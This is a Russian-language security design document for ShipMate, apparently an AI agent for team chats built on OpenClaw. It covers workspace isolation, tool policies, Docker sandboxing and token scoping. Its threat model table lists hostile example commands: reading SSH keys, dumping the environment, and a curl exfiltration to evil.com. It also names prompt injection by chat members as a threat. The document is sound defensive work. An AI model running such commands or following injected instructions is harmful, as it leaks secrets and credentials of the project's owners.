# ShipMate — Security & Project Isolation

## Проблема

ShipMate добавляется в командный чат (Telegram-группа, Slack-канал, Discord-сервер) и отвечает **всем участникам**. При этом OpenClaw под капотом имеет доступ к файловой системе, shell, и потенциально — к другим проектам на том же хосте.

**Риски без изоляции:**
- Разработчик спрашивает "покажи структуру проекта" → ShipMate показывает файлы соседнего проекта
- Разработчик говорит "найди все .env файлы" → ShipMate находит секреты других проектов
- Разработчик просит "git log" → ShipMate показывает историю не того репозитория
- ShipMate через `bash` обращается к ресурсам, к которым не должен иметь доступ

## Принцип: One Instance = One Project

Каждый инстанс ShipMate привязан к **одному конкретному проекту** и физически не может получить доступ к другим.

Это достигается через **три уровня изоляции**, которые применяются на этапе setup.

---

## Уровень 1: Workspace Isolation (обязательный)

### Что

OpenClaw workspace (`agents.defaults.workspace`) указывает на **корень целевого проекта**, а не на домашнюю директорию или общий workspace.

### Как

При setup ShipMate:

```json5
// openclaw.json
{
  agents: {
    defaults: {
      workspace: "/path/to/target-project",  // ТОЛЬКО целевой проект
    },
  },
}
```

### Что это даёт

- `read` / `write` / `edit` tools работают относительно workspace
- Bootstrap файлы (`AGENTS.md`, `SOUL.md`) инжектятся из workspace
- Skills загружаются из `<workspace>/skills/`
- Агент "видит" только свой проект при навигации

### Ограничения

Workspace isolation — **мягкая** граница. Агент через `bash` всё ещё может выполнить `cat /etc/passwd` или `ls ~`. Поэтому нужен уровень 2.

---

## Уровень 2: Tool Policy (обязательный)

### Что

OpenClaw tool policy ограничивает какие tools доступны агенту.

### Для team-facing deployment (группа/канал)

```json5
// openclaw.json
{
  tools: {
    deny: [
      "group:fs",        // запрет read/write/edit/apply_patch
      "group:ui",        // запрет browser/canvas
      "group:nodes",     // запрет device nodes
      "group:automation", // запрет cron/gateway management
    ],
    allow: [
      "bash",            // ограниченный bash (см. AGENTS.md правила)
      "shipmate_*",      // кастомные tools из ShipMate plugin
    ],
    elevated: {
      enabled: false,    // запрет выхода из sandbox
    },
  },
}
```

### Что это даёт

- Агент не может читать/писать файлы напрямую через OpenClaw tools
- Все файловые операции — только через ShipMate plugin tools с валидацией
- Нет elevated mode — нельзя обойти ограничения

### Bash Guardrails

Bash остаётся доступным (для `gh`, `git`, `jq`), но ограничивается через:
1. **AGENTS.md правила** — LLM-уровень: "выполняй bash только для gh/git/jq команд в рабочей директории"
2. **ShipMate plugin validator** — tool-уровень: перехватывает bash-вызовы, валидирует команды по allowlist
3. **Sandbox mode** — если доступен Docker, bash выполняется в контейнере

### Bash-запись в memory/ (by design)

`group:fs` запрещает OpenClaw tools (`read`, `write`, `edit`, `apply_patch`), но `bash` входит в `group:runtime` и **не блокируется** deny `group:fs`. Это используется целенаправленно:

- ShipMate пишет sprint-метрики в `memory/YYYY-MM-DD.md` через `bash` (`cat >> ...`)
- `memory_search` / `memory_get` входят в `group:memory` (не `group:fs`) — читают memory-файлы в group sessions
- Это **не обход** security policy — это архитектурное решение: bash ограничен workspace (sandbox), а persistence нужен для работы sprint-analytics

**Почему не `write` tool:** `write` входит в `group:fs` и запрещён в team deployments. Bash — единственный способ записи в `memory/` при deny `group:fs`.

---

## Уровень 3: Sandbox (рекомендуемый для production)

### Что

OpenClaw поддерживает запуск non-main сессий в Docker-контейнерах. Для team-facing ShipMate **все** сессии — non-main (группа, не DM владельца).

### Как

```json5
// openclaw.json
{
  agents: {
    defaults: {
      sandbox: {
        mode: "all",  // или "non-main" если владелец использует DM
        docker: {
          image: "shipmate/sandbox:latest",  // образ с gh, git, jq
          setupCommand: "apt-get update && apt-get install -y gh git jq",
          mountWorkspace: true,   // монтирует ТОЛЬКО workspace
          workspaceAccess: "rw",  // "rw" обязательно для persistence в memory/
        },
      },
    },
  },
}
```

### Что это даёт

- Bash выполняется в изолированном Docker-контейнере
- Контейнер видит только workspace (и то read-only если настроено)
- Нет доступа к хостовой файловой системе, другим проектам, секретам
- Сетевой доступ ограничен (по необходимости)

---

## Setup Wizard: Enforcement

ShipMate должен проверять изоляцию на этапе setup и **отказываться запускаться** при небезопасной конфигурации.

### Обязательные проверки при старте

```
✅ Workspace указывает на конкретный проект (не ~ и не /)
✅ Workspace содержит .git (это git-репозиторий)
✅ Tool policy: group:fs в deny
✅ Tool policy: elevated.enabled = false
✅ GitHub token scoped к одному репозиторию (если используется)
⚠️ Sandbox mode не включён (рекомендация, не блокер)
```

### Опасные конфигурации (блокируют запуск)

```
❌ workspace = "/" или workspace = "~" или workspace = "/Users/*"
❌ group:fs не в deny И sandbox не включён
❌ elevated.enabled = true
❌ GitHub token с доступом ко всем репозиториям org
```

### Предупреждения (не блокируют, но логируются)

```
⚠️ Sandbox mode не включён — bash имеет доступ к хосту
⚠️ GitHub token не проверен на scope (Fine-grained PAT рекомендуется)
⚠️ Нет rate limits на tool calls
```

---

## GitHub Token Scoping

### Рекомендация: Fine-grained Personal Access Token

```
Repository access: Only select repositories → target-repo
Permissions:
  - Contents: Read (для чтения кода)
  - Pull requests: Read and write (для создания PR)
  - Issues: Read and write (для работы с задачами)
  - Actions: Read (для статуса CI)
  - Metadata: Read (обязательный)
```

### Запрещено

- Classic PAT с `repo` scope (доступ ко ВСЕМ репозиториям)
- Tokens с `admin:org` scope
- Tokens с `delete_repo` permission

### Валидация при setup

```bash
# Проверить scope токена
gh auth status
# Должен показать только целевой репозиторий
```

---

## Модель угроз

| Угроза | Вектор | Митигация |
|--------|--------|-----------|
| Утечка файлов соседнего проекта | `bash: cat ~/other-project/secrets.env` | Sandbox (Docker), workspace isolation |
| Утечка секретов хоста | `bash: env` или `bash: cat ~/.ssh/id_rsa` | Tool policy (deny group:fs), sandbox |
| Prompt injection от участника чата | Злонамеренное сообщение заставляет агента выполнить опасную команду | Tool policy, bash allowlist, AGENTS.md guardrails |
| GitHub token leaks к другим repos | Token с broad scope используется для чтения чужих repos | Fine-grained PAT scoped к одному repo |
| Escalation через elevated mode | Агент запрашивает elevated для обхода ограничений | `elevated.enabled: false` (hardcoded в setup) |
| Data exfiltration через bash | `curl https://evil.com -d "$(cat secret)"` | Sandbox network policy, bash command allowlist |

---

## Deployment Modes и их Security Profile

### Mode 1: Local Development (личное использование)

```
Изоляция: Workspace only
Sandbox: Не нужен
Tool Policy: Мягкий (fs разрешён)
Кто видит: Только владелец
```

Для личного использования (один разработчик, свой ноутбук) жёсткая изоляция не нужна — владелец и так имеет доступ ко всему.

### Mode 2: Team Chat (группа разработки)

```
Изоляция: Workspace + Tool Policy + Sandbox (рекомендуется)
Sandbox: Docker (рекомендуется) или tool policy (минимум)
Tool Policy: Жёсткий (deny group:fs, no elevated)
Кто видит: Все участники группы
```

**Это основной use case ShipMate.** Требует полной изоляции.

### Mode 3: Railway / Cloud Deployment

```
Изоляция: Workspace + Tool Policy + Container (Railway по умолчанию)
Sandbox: Контейнер Railway = sandbox по умолчанию
Tool Policy: Жёсткий
Кто видит: Все участники группы
```

Railway deployment изолирован по определению — сервис живёт в своём контейнере и не имеет доступа к файловой системе хоста. Workspace = volume `/data`.

---

## Supply Chain Security

### Проблема

По данным Bitdefender (февраль 2026), ~17% skills на ClawHub содержат вредоносный код. ClawHub не имеет code signing, автоматического сканирования, или криптографической верификации. Единственная защита — community reporting (>3 reports = auto-hide).

### Стратегия дистрибуции ShipMate

| Канал | Роль | Доверие |
|-------|------|---------|
| **GitHub releases** | Primary distribution | Verified source, signed commits |
| **ClawHub** | Discovery only | Link back to GitHub, предупреждение "verify source" |

### Верификация установки

После клонирования из GitHub:

```bash
# Проверить что клонировано из правильного репозитория
git remote -v
# Должно показать: github.com/AiYsen/shipmate

# Проверить подпись последнего тега (когда доступно)
git tag -v $(git describe --tags --abbrev=0)

# Проверить checksums (когда доступно)
sha256sum -c CHECKSUMS.txt
```

### Правила для пользователей

- **Всегда устанавливайте из официального GitHub-репозитория**, не из ClawHub напрямую
- **Проверяйте git remote** после клонирования
- **Не устанавливайте** skills из неизвестных источников без проверки содержимого
- **Читайте SKILL.md** перед установкой — skills это prompt instructions, они легко читаемы
- **Проверяйте plugin code** (index.ts) — TypeScript читаем, ищите подозрительные вызовы (`fetch`, `curl`, `eval`)

### Что мы делаем

- GPG-signed tags для каждого release
- `CHECKSUMS.txt` с SHA256 для всех файлов
- Pinned dependencies (если plugin использует npm packages)
- No dynamic code loading — все skills статические markdown файлы
- Open source — весь код доступен для аудита

---

## Чеклист безопасности для пользователей

Перед добавлением ShipMate в командный чат:

- [ ] Workspace указывает на конкретный git-репозиторий проекта
- [ ] `group:fs` в deny list tool policy
- [ ] `elevated.enabled: false`
- [ ] GitHub token — Fine-grained PAT scoped к одному репозиторию
- [ ] Sandbox mode включён (Docker) — или хотя бы tool policy настроен
- [ ] `groupPolicy: "allowlist"` в Telegram/Slack/Discord
- [ ] `requireMention: true` для группы (отвечает только при обращении)
- [ ] Нет секретов в workspace файлах (проверить `.gitignore`)
- [ ] Rate limits настроены
